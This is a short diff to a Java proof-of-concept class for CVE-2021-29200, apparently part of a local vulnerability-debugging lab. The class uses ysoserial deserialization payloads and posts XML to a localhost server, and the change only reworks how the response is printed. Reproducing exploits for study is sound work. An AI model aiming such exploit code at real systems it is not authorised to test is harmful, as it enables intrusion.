@@ -2,6 +2,7 @@ package cve;
 
 import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
 import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
+import com.pacemrc.vuldebug.common.utils.http.Response;
 import org.apache.http.client.methods.HttpPost;
 import ysoserial.payloads.ObjectPayload;
 
@@ -21,7 +22,8 @@ public class CVE_2021_29200 {
         HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
         HttpPost httpPost = new HttpPost(url);
         httpPost.addHeader("Content-Type","application/xml");
-        String s = httpRequest.sendStringPost(httpPost, body);
-        System.out.println(s);
+        Response response = httpRequest.sendStringPost(httpPost, body);
+        System.out.println(response.getStatusCode());
+        System.out.println(response.getResponseBody());
     }
 }
